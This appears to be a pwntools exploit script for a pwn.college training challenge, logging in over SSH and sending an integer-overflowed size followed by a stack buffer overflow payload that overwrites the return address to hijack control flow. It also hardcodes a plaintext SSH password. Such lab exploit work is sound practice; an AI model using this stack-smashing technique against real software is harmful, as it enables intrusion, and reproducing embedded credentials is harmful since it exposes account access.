from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level4_testing1")
p.sendlineafter(b'size:',str(4294967295))
pay = b'A'*0x78 + p64(0x401b46)
p.sendafter(b'bytes)!\n',pay)

p.interactive()